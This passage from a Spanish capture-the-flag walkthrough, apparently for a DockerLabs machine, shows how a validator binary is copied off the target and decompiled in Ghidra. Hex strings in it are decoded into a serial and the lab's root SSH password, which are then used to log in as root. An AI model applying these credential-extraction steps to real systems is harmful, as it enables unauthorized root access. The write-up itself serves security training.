Serial invalido, vuelve a intentar
```

Vemos que nos pide un `SERIAL` para entrar en el modo administrador, por lo que le vamos hacer `ingenieria inversa` para descubrir cual es el `SERIAL`, vamos a pasarnoslo a nuestra maquina `host`, pero nos pasaremos el siguiente binario que se encuentra aqui:

```shell
cd .zprofile/
```

Si listamos:

```shell
/bin/ls -la
```

Info:

```
total 24
drwxr-xr-x 2 darksblack darksblack  4096 Jan  1 08:57 .
drwxr-x--- 1 darksblack darksblack  4096 Jan  1 09:02 ..
-rwxr-xr-x 1 darksblack darksblack 14952 Jan  1 08:57 OlympusValidator
```

Por lo que vemos tiene pinta de contener el `SERIAL`.

```shell
/bin/python3 -m http.server
```

Y en nuestro `host`:

```shell
wget http://<IP>:8000/OlympusValidator
```

Info:

```
--2025-01-02 04:37:05--  http://172.17.0.2:8000/OlympusValidator
Connecting to 172.17.0.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15048 (15K) [application/octet-stream]
Saving to: ‘OlympusValidator’

OlympusValidator                                 100%[============================================================================>]  14.70K  --.-KB/s    in 0s      

2025-01-02 04:37:05 (801 MB/s) - ‘OlympusValidator’ saved [15048/15048]
```

Una vez que ya nos lo hayamos pasado, abriremos `Ghidra`.

## Ghidra

```shell
ghidra
```

Crearemos un nuevo proyecto y nos aparecera el siguiente icono:

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

Le daremos a dicho icono y despues importaremos el binario `OlympusValidator` para decompilarlo y ver donde se encuentra el `SERIAL`:

Si nos vamos a la `function` llamada `spoof` veremos lo siguiente:

```c
/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

void spoof(void)

{
  printf("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",0x43,0x72,
         0x65,100,0x65,0x6e,99,0x69,0x61,0x6c,0x65,0x73,0x20,0x73,0x73,0x68,0x20,0x72,0x6f,0x6f,0x74
         ,0x3a,0x40,0x23,0x2a,0x29,0x32,0x37,0x37,0x32,0x38,0x30,0x29,0x36,0x78,0x34,0x6e,0x30);
  return;
}
```

Es lo que nos muestra cuando el `SERIAL` es correcto, por lo que vamos a decodificarlo:

```
0x43, 0x72, 0x65, 100, 0x65, 0x6e, 99, 0x69, 0x61, 0x6c, 0x65, 0x73, 0x20, 0x73, 0x73, 0x68, 0x20, 
0x72, 0x6f, 0x6f, 0x74, 0x3a, 0x40, 0x23, 0x2a, 0x29, 0x32, 0x37, 0x37, 0x32, 0x38, 0x30, 0x29, 
0x36, 0x78, 0x34, 0x6e, 0x30
```

Info:

```
- `0x43` → `C`
- `0x72` → `r`
- `0x65` → `e`
- `100` → `d`
- `0x65` → `e`
- `0x6e` → `n`
- `99` → `c`
- `0x69` → `i`
- `0x61` → `a`
- `0x6c` → `l`
- `0x65` → `e`
- `0x73` → `s`
- `0x20` → espacio
- `0x73` → `s`
- `0x73` → `s`
- `0x68` → `h`
- `0x20` → espacio
- `0x72` → `r`
- `0x6f` → `o`
- `0x6f` → `o`
- `0x74` → `t`
- `0x3a` → `:`
- `0x40` → `@`
- `0x23` → `#`
- `0x2a` → `*`
- `0x29` → `)`
- `0x32` → `2`
- `0x37` → `7`
- `0x37` → `7`
- `0x32` → `2`
- `0x38` → `8`
- `0x30` → `0`
- `0x29` → `)`
- `0x36` → `6`
- `0x78` → `x`
- `0x34` → `4`
- `0x6e` → `n`
- `0x30` → `0`
```

```
Credenciales ssh root:@#*)277280)6x4n0
```

Por lo que vemos nos muestra la contraseña de `root`, por lo que haremos lo siguiente:

```shell
ssh root@<IP>
```

Metemos como contraseña `@#*)277280)6x4n0` y veremos que estaremos dentro como el usuario `root`:

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:xONrMp8rZSaI/Uq/QIDSLoGQkEPxR3uzybEighqYGW8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Linux dockerlabs 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@dockerlabs:~#
```

> PASO EXTRA:

Si nosotros queremos descubrir el `SERIAL` podremos irnos a la `function` llamada `main` y ver lo siguiente:

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  char local_52 [62];
  undefined4 *local_14;
  
  local_14 = &param_1;
  if (param_1 == 2) {
    snprintf(local_52,0x32,"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",0x41,0x36,0x37,0x38,
             0x2d,0x47,0x48,0x53,0x33,0x2d,0x4f,0x4c,0x50,0x30,0x2d,0x51,0x51,0x50,0x31,0x2d,0x44,
             0x46,0x4d,0x5a);
    iVar2 = strcmp(*(char **)(param_2 + 4),local_52);
    if (iVar2 == 0) {
      puts("VALIDO");
      spoof();
    }
    else {
      puts("INVALIDO");
    }
    uVar1 = 0;
  }
  else {
    puts("Uso: ./validar_serial <serial>");
    uVar1 = 1;
  }
  return uVar1;
}
```

Vamos a decodificar lo que se esta comparando con el `SERIAL`:

```
0x41, 0x36, 0x37, 0x38, 0x2d, 0x47, 0x48, 0x53, 0x33, 0x2d, 0x4f, 0x4c, 0x50, 0x30, 0x2d, 0x51, 0x51, 
0x50, 0x31, 0x2d, 0x44, 0x46, 0x4d, 0x5a
```

Info:

```
- `0x41` → `A`
- `0x36` → `6`
- `0x37` → `7`
- `0x38` → `8`
- `0x2d` → `-`
- `0x47` → `G`
- `0x48` → `H`
- `0x53` → `S`
- `0x33` → `3`
- `0x2d` → `-`
- `0x4f` → `O`
- `0x4c` → `L`
- `0x50` → `P`
- `0x30` → `0`
- `0x2d` → `-`
- `0x51` → `Q`
- `0x51` → `Q`
- `0x50` → `P`
- `0x31` → `1`
- `0x2d` → `-`
- `0x44` → `D`
- `0x46` → `F`
- `0x4d` → `M`
- `0x5a` → `Z`
```

```
A678-GHS3-OLP0-QQP1-DFMZ
```

Y si ejecutamos el `OlympusValidator`:

```shell
./OlympusValidator A678-GHS3-OLP0-QQP1-DFMZ
```

Info:

```
VALIDO
Credenciales ssh root:@#*)277280)6x4n0
```
